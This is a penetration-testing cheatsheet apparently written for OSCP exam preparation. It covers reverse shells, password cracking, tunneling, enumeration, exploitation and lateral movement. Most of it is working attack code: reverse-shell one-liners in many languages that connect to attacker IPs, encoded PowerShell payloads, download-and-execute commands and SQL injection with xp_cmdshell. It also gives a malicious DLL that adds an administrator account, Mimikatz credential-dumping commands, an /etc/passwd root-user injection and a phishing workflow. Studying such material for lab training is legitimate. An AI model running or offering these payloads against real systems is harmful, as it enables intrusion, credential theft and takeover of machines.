# OSCP Cheatsheet

**Author:** Leonardo Tamiano

---

## Table of Contents

- [Reverse Shells](#reverse-shells)
- [Cracking](#cracking)
- [Tunneling](#tunneling)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Post-Exploitation / Lateral Movement](#post-exploitation--lateral-movement)
- [Reporting](#reporting)

---

## Reverse Shells

### Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash -c "bash -i >& /dev/tcp/192.168.45.183/443 0>&1"
```

### Perl

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.218",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```php
<?php $sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

```bash
php -r '$sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```bash
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.218 1234 >/tmp/f
```

### Malicious EXE Payload (msfvenom)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=7777 -f exe -o auditTracker.exe
```

#### Listener Endpoint

```bash
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.45.235; set lport 7777; set ExitOnSession false; exploit -j"
```

### PowerShell

```powershell
powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.235:1337/Invoke-PowerShellTcp.ps1\")"
```

#### Create PowerShell One-Liner (Base64 Encoded)

```powershell
pwsh

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText

powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

#### Generate Base64 PowerShell Reverse Shell (Python)

> Remember to change IP and PORT.

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

return cmd
```

---

## Cracking

### KeePass

Extract the password hash:

```bash
keepass2john Database.kdbx > keepass.hash
```

Crack with **john**:

```bash
john --wordlist=/home/leo/repos/projects/wordlists/passwords/rockyou.txt Keepasshash.txt
```

Crack with **hashcat** (strip the initial `Database:` from the hash first):

```bash
hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule --force
```

### SSH Key

Extract the hash:

```bash
ssh2john id_rsa > ssh.hash
```

Crack with **john**:

```bash
john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash.txt
```

Crack with **hashcat**:

```bash
hashcat -m 22921 ssh.hash rockyou.txt --force
```

### NTLM

Crack with **hashcat** (mode `1000`):

```bash
hashcat -m 1000 nelly.hash rockyou.txt -r best64.rule --force
```

### Net-NTLMv2

Crack with **hashcat** (mode `5600`):

```bash
hashcat -m 5600 paul.hash rockyou.txt --force
```

### AS-REP Roasting

Perform AS-REP attack over a Windows AD:

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

Example hash output:

```
$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578...
```

Crack with **hashcat** (mode `18200`):

```bash
sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
```

### Kerberoasting

Perform Kerberoasting attack over a Windows AD:

```bash
proxychains impacket-GetUserSPNs -request -dc-ip 10.10.132.146 oscp.exam/web_svc
```

Crack with **hashcat** (mode `13100`):

```bash
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
```

---

## Tunneling

### socat

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

### SSH

Four different types of tunnel:

#### Local Port Forwarding (`-L`)

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@server
```

#### Dynamic Port Forwarding (`-D`)

```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

#### Remote Port Forwarding (`-R`)

Start a local SSH server:

```bash
sudo systemctl start ssh
```

Connect back from the remote machine. In this case, listen on port 2345 on the Kali machine (`127.0.0.1:2345`) and forward all traffic to the PostgreSQL port on PGDATABASE01 (`10.4.50.215:5432`):

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

Stop the SSH server:

```bash
sudo systemctl stop ssh
```

#### Remote Dynamic Port Forwarding (`-R` without endpoints)

Start a local SSH server:

```bash
sudo systemctl start ssh
```

Connect back from the remote machine. This creates a SOCKS5 proxy on the local machine at that port, able to access all interfaces available to the victim machine:

```bash
ssh -N -R 9998 kali@192.168.118.4
```

Stop the SSH server:

```bash
sudo systemctl stop ssh
```

### Chisel

Download the executable on the remote machine:

```bash
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
```

Start the chisel server on the Linux attacker box:

```bash
./chisel64.elf server -p 8000 --reverse
```

Connect from the remote machine:

```bash
chisel64.exe client 192.168.45.217:8000 R:socks
```

This creates a SOCKS5 proxy at `127.0.0.1:1080`. Add to proxychains config:

```
socks5 127.0.0.1:1080
```

---

## Enumeration

### General

#### Nmap Port Scanning

```bash
nmap -sC -sV <IP>
nmap -p- <IP>
sudo nmap -sU -p161 <IP>
proxychains nmap -sT --top-ports=100 -Pn <IP>
```

#### Port Scanning in Windows

```powershell
Test-NetConnection -Port 445 192.168.50.151
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

#### Search for Exploits

```bash
searchsploit <SOFTWARE>
searchsploit -m 16051
```

#### DNS Zone Transfer

```bash
dig axfr oscp.exam @192.168.221.156
```

#### Login with RDP

```bash
xfreerdp /u:yoshi /p:"Mushroom!" /v:172.16.219.82
```

#### KeePass Database

```bash
kpcli --kdb=Database.kdbx
kpcli:/Database/Network> show -f 0
```

#### Extract Data from PDF

```bash
exiftool -a file.pdf
```

### Brute Forcing

#### RDP

```bash
hydra -l user -P rockyou.txt rdp://192.168.50.202
```

#### FTP

```bash
hydra -l itadmin -I -P rockyou.txt -s 21 ftp://192.168.247.202
```

#### SSH

```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

#### HTTP POST Login

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

#### Password Spraying (RDP)

```bash
hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.247.202
```

### HTTP

#### Gobuster - Directory Mode

```bash
gobuster dir -t20 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.216.121 -x aspx
```

#### Gobuster - VHost Mode

```bash
gobuster vhost --wordlist /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://oscp.exam:8000 --exclude-length 334
```

#### wfuzz

```bash
wfuzz -w /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt http://192.168.238.150:8080/search?FUZZ=FUZZ
```

#### Kiterunner (API Endpoint Enumeration)

```bash
kiterunner scan http://192.168.243.143/api/ -w routes-small.kite -x 20
```

#### PHP Filters with LFI

```bash
curl http://192.168.193.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../..//var/www/html/backup.php
curl http://192.168.193.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
```

#### WordPress Enumeration (wpscan)

```bash
# Default enumeration
wpscan --url http://10.10.10.88/webservices/wp

# Enumerate vulnerable plugins
wpscan --url http://10.10.10.88/webservices/wp --enumerate vp

# Enumerate all plugins
wpscan --url http://10.10.10.88/webservices/wp --enumerate ap

# Enumerate all plugins using proxy
wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap

# Enumerate everything
wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap tt at
```

### SMB

#### Nmap SMB Discovery

```bash
nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
```

#### Check for Anonymous Share

```bash
smbmap -H <IP>
```

#### Connect to SMB Share

```bash
smbclient //172.16.246.11/C$ -U medtech.com/joe%Password
smbclient //192.168.212.248/transfer -U damon --pw-nt-hash 820d6348590813116884101357197052 -W relia.com
```

#### Download Entire Share Recursively

```bash
smbget -a -R smb://active/Replication
```

#### List Shares (with credentials)

```bash
crackmapexec smb 192.168.242.147 -u web_svc -p Dade --shares
```

#### List Shares (with NTLM hash)

```bash
crackmapexec smb 192.168.242.147 -u web_svc -H 822d2348890853116880101357194052
```

#### Password Spraying

```bash
crackmapexec smb 192.168.242.147 -u usernames.txt -p Diamond1 --shares
```

#### Crawl All Files

```bash
crackmapexec smb active -u "" -p "" -M spider_plus
```

### SNMP

#### Setup

```bash
sudo apt-get install snmp-mibs-downloader
download-mibs
sudo nano /etc/snmp/snmp.conf  # comment line saying "mibs :"
```

#### Enumerate Communities

```bash
onesixtyone -c common-snmp-community-strings-onesixtyone.txt 192.168.238.149 -w 100
```

#### Simple Walk

```bash
snmpbulkwalk -c public -v2c 192.168.238.149 > out.txt
```

#### Enumerate Extended Objects

```bash
snmpwalk -v1 -c public 192.168.221.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

### Linux Enumeration

#### LinEnum

```bash
curl http://192.168.45.198/linenum.sh > linenum.sh
chmod +x linenum.sh
./linenum.sh | tee linenum_output.txt
```

#### LinPEAS

```bash
curl http://192.168.45.198/linpeas.sh > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
```

#### pspy64 (Cronjob Monitoring)

```bash
curl http://192.168.45.198/pspy64 > pspy64
chmod +x pspy64
./pspy64
```

#### SUID Files

```bash
find / -perm -u=s 2>/dev/null
```

#### SGID Files

```bash
find / -perm -g=s -type f 2>/dev/null
```

#### Search for Files by Name

```bash
find / -name "*GENERIC*" -ls
```

#### Print Environment Variables

```bash
env
```

### Windows Enumeration

#### Basic Enumeration

```powershell
# OS, version and architecture
systeminfo

# Launch PowerShell
powershell -ep bypass

# Current user
whoami

# User privileges
whoami /priv

# User groups
whoami /groups

# List users
net user

# User details
net user <MY-NAME>

# Account policy
net accounts

# Local users and groups
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember <GROUP-NAME>

# Network information
ipconfig /all
route print
netstat -ano

# Environment variables
dir env:

# Installed apps (32 bit)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Installed apps (64 bit)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Running processes
Get-Process
```

#### Files, Services and History

Search files recursively:

```powershell
Get-ChildItem -Path C:\Users\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Get permissions:

```powershell
icacls auditTracker.exe
```

Get service info:

```powershell
Get-Service * | Select-Object Displayname,Status,ServiceName,Can*
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Search history:

```powershell
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Public\Transcripts\transcript01.txt
```

Connect to MSSQL database:

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

#### File Transfer

Using `certutil`:

```powershell
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
```

Using `Invoke-WebRequest`:

```powershell
iwr -uri http://192.168.45.159:1337/winPEASx64.exe -Outfile winPEASx64.exe
```

Transfer files from Windows using `nc`:

```powershell
Get-Content "Database.kdbx" | .\nc.exe 192.168.45.239 5555
```

Typical files to transfer:

```powershell
iwr -uri http://192.168.45.159:1337/ncat.exe -Outfile ncat.exe
iwr -uri http://192.168.45.159:1337/mimikatz64.exe -Outfile mimikatz64.exe
iwr -uri http://192.168.45.159:1337/chisel64.exe -Outfile chisel64.exe

iwr -uri http://192.168.45.159:1337/winpeas64.exe -Outfile winpeas64.exe
iwr -uri http://192.168.45.159:1337/privesccheck.ps1 -Outfile privesccheck.ps1
iwr -uri http://192.168.45.159:1337/SharpHound.exe -Outfile SharpHound.exe

iwr -uri http://192.168.45.159:1337/insomnia_shell.aspx -Outfile insomnia_shell.aspx
iwr -uri http://192.168.45.159:1337/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.45.159:1337/GodPotato-NET2.exe -Outfile GodPotato-NET2.exe
iwr -uri http://192.168.45.159:1337/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
iwr -uri http://192.168.45.159:1337/GodPotato-NET35.exe -Outfile GodPotato-NET35.exe
iwr -uri http://192.168.45.159:1337/JuicyPotatoNG.exe -Outfile JuicyPotatoNG.exe
```

Using `WebClient`:

```powershell
(new-object System.Net.WebClient).DownloadFile("http://10.10.122.141/Script/mimikatz64.exe", "C:\TEMP\mimikatz64.exe")
```

Start SMB server (attacker):

```bash
impacket-smbserver smbfolder $(pwd) -smb2support -user kali -password kali
```

Use SMB server from Windows:

```powershell
$pass = convertto-securestring 'kali' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('kali', $pass)
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\192.168.45.245\smbfolder

cd kali:
copy kali:\PrintSpoofer64.exe C:\TEMP
copy kali:\ncat.exe C:\TEMP
copy kali:\SharpHound.exe C:\TEMP
```

#### Automated Tools

**winPEASx64** - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

> Issue with latest build of missing DLL. Use this release: https://github.com/carlospolop/PEASS-ng/releases/tag/20230423-4d9bddc5

```powershell
iwr -uri http://192.168.45.159:1337/winpeas64.exe -Outfile winpeas64.exe
./winPEASx64.exe
```

**PrivescCheck** - https://github.com/itm4n/PrivescCheck

```powershell
iwr -uri http://192.168.45.159:1337/privesccheck.ps1 -Outfile privesccheck.ps1
. .\privesccheck.ps1
Invoke-PrivescCheck -Extended -Report "privesccheck_$($env:COMPUTERNAME)"
```

### Windows AD Enumeration

#### List All Joined Machines

```powershell
Get-ADComputer -Filter * -Properties Name -Server "oscp.exam"
Get-ADComputer -Filter * -Properties ipv4Address, OperatingSystem, OperatingSystemServicePack | Format-List name, ipv4*, oper*
```

#### CrackMapExec

Enumerate smb, winrm, rdp and ssh (with password and hashes):

```bash
proxychains crackmapexec smb IP1 IP2 -u USERNAME -p PASSWORD --shares
proxychains crackmapexec winrm IP1 IP2 -u USERNAME -p PASSWORD --continue-on-success
proxychains crackmapexec rdp IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec ssh IP1 IP2 -u USERNAME -p PASSWORD

proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HASH --shares
```

#### SharpHound & BloodHound

Transfer SharpHound, collect data, transfer back:

```powershell
iwr -uri http://192.168.45.159:1337/SharpHound.exe -Outfile SharpHound.exe
./SharpHound.exe --CollectionMethods All
```

Start neo4j (default creds: `neo4j:admin`):

```bash
sudo /usr/bin/neo4j console
# Visit http://localhost:7474/browser/
```

Launch BloodHound:

```bash
./BloodHound --no-sandbox
```

#### PowerView

> TODO

---

## Exploitation

### Web

#### SQLi

Basic SQLi:

```sql
' OR 1=1 --
```

XP_CMDSHELL in MSSQL:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.248:1337/Invoke-PowerShellTcp.ps1\")" '; --
```

Union Select:

```
username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password=password&login=
```

### Linux Exploitation

#### Add Root User to passwd

Add `root2` with password `w00t`:

```bash
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

#### Abuse tar Wildcard (`tar -zxf /tmp/backup.tar.gz *`)

```bash
echo "python3 /tmp/rev.py" > demo.sh
touch -- "--checkpoint-action=exec=sh demo.sh"
touch -- "--checkpoint=1"
```

### Windows Exploitation

> References:
> - https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
> - https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
> - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

#### Reverse Shell via Unreliable Exploit (Three Steps)

```python
payload_1 = f'cmd.exe /c mkdir C:\TEMP'.encode('utf-8')
payload_3 = f'powershell -c "iwr -uri http://192.168.45.215/shell.exe -Outfile C:\TEMP\shell.exe"'.encode('utf-8')
payload_4 = f'cmd.exe /c "C:\TEMP\shell.exe"'.encode('utf-8')
```

#### SQLi Using `xp_cmdshell`

Enable `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Execute commands:

```sql
EXEC xp_cmdshell 'whoami';
```

Get reverse shell:

```sql
' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.248:1337/Invoke-PowerShellTcp.ps1\")" '; --
```

#### Exploit `SeImpersonatePrivilege`

**PrintSpoofer:**

```powershell
./PrintSpoofer64.exe -c "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
.\PrintSpoofer64.exe -i -c powershell.exe
```

**GodPotato:**

```powershell
./GodPotato-NET2.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
./GodPotato-NET4.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
./GodPotato-NET35.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
```

#### Dumping Logon Passwords with Mimikatz

```powershell
./mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
```

#### Dumping LSA with Mimikatz

```powershell
reg save hklm\sam sam.hiv
reg save hklm\security security.hiv
reg save hklm\system system.hiv
./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
```

```powershell
./mimikatz64.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
./mimikatz64.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
```

#### Change User (Requires GUI / RDP)

```powershell
runas /user:backupadmin cmd
```

#### Cross-Compilation: Malicious EXE

```c
#include <stdlib.h>

int main()
{
    system("C:\\TEMP\\ncat.exe 192.168.45.217 7777 -e cmd");
    return 0;
}
```

```bash
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
```

#### Cross-Compilation: Malicious DLL

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
    HANDLE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        int i;
        i = system("net user dave2 password123! /add");
        i = system("net localgroup administrators dave2 /add");
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc adduser_dll.c --shared -o adduser.dll
```

### Windows AD Exploitation

#### Bruteforcing Kerberos

> https://github.com/ropnop/kerbrute
>
> TODO: bruteuser, bruteforce, passwordspray, userenum

#### Kerberoasting

Through SOCKS proxy:

```bash
proxychains impacket-GetUserSPNs -request -dc-ip 10.10.132.146 oscp.exam/web_svc
```

With Rubeus (https://github.com/GhostPack/Rubeus):

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Crack:

```bash
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
```

**Targeted Kerberoasting:**

1. Leverage **GenericWrite** or **GenericAll** permission to set an SPN for the target user
2. Kerberoast that user and crack the password
3. Remove the assigned SPN

#### AS-REP Roasting

```bash
proxychains impacket-GetNPUsers -dc-ip 192.168.221.70 -request -outputfile hashes corp.com/pete
```

With Rubeus:

```powershell
.\Rubeus.exe asreproast /nowrap
```

Crack:

```bash
sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
```

**Targeted AS-REP Roasting:**

1. Leverage **GenericWrite** or **GenericAll** to modify the **User Account Control** value to not require Kerberos pre-auth
2. Perform typical AS-REP roasting

#### DCSync Attack

Required privileges:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

By default, members of **Domain Admins**, **Enterprise Admins**, and **Administrators** groups have these rights.

Using mimikatz:

```
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
```

Using impacket-secretsdump:

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"password"@192.168.50.70
```

#### Silver Tickets

Required information:

1. **SPN password hash** (obtain via mimikatz)
2. **Domain SID** (obtain via `whoami /user`, e.g. `S-1-5-21-1987370270-658905905-1781884369`)
3. **Target SPN** (enumerate via `impacket-GetUserSPNs`)

Forge a TGS (silver ticket) with mimikatz:

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:5d28cf5252d32971419580a51484ca09 /user:geffadmin
```

#### Responder: Net-NTLMv2 Capture

1. Set up a fake SMB server:

```bash
sudo responder -I tun0
```

2. Force connection from the remote target:

```powershell
dir \\192.168.45.159\test
```

3. Crack the hash:

```bash
hashcat -m 5600 paul.hash rockyou.txt
```

#### Net-NTLM Relaying

Relay NTLM authentication to another Windows service. If the relayed authentication is from a user with local administrator privileges, it can be used to authenticate and execute commands over SMB.

Using `ntlmrelayx` (`-t` = target, `-c` = command):

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

#### GPP (Group Policy Preferences)

Example `Groups.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

Decrypt `cpassword` with Python:

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

if __name__ == "__main__":
    key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    iv = b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    cipher = AES.new(key, AES.MODE_CBC, iv)

    ciphertext = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ=="
    ciphertext = base64.b64decode(ciphertext)

    plaintext = cipher.decrypt(ciphertext)
    plaintext = unpad(plaintext, AES.block_size)

    print(plaintext.decode())
```

```bash
python3 -m venv venv
. venv/bin/activate
pip3 install pycryptodome
python3 gpp-decrypt.py
```

> The AES key was published by Microsoft:
> - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
> - https://adsecurity.org/?p=2288

### Client-Side Exploitation

#### Email Phishing Attack

1. Install and enable WebDAV server:

```bash
pip3 install wsgidav
pip3 install cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
```

2. Create `config.Library-ms` (update IP address):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.239</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

3. Craft a malicious `powershell.lnk` (in a Windows VM) with payload:

```powershell
powershell -c "iex(new-object net.webclient).downloadstring('http://192.168.45.239:1337/Invoke-PowerShellTcp.ps1')"
```

4. Create `body.txt`:

```
Hi,

please click on the attachment :D
```

5. Send via SMTP with `swaks`:

```bash
swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

---

## Post-Exploitation / Lateral Movement

Steps after rooting a machine to proceed further, extract data, and move to the next machine until reaching the domain controller.

### Linux

#### Persistence via Cronjob

> TODO: Install cronjob to spawn reverse shell every minute

### Windows

#### Chisel and Internal Enumeration

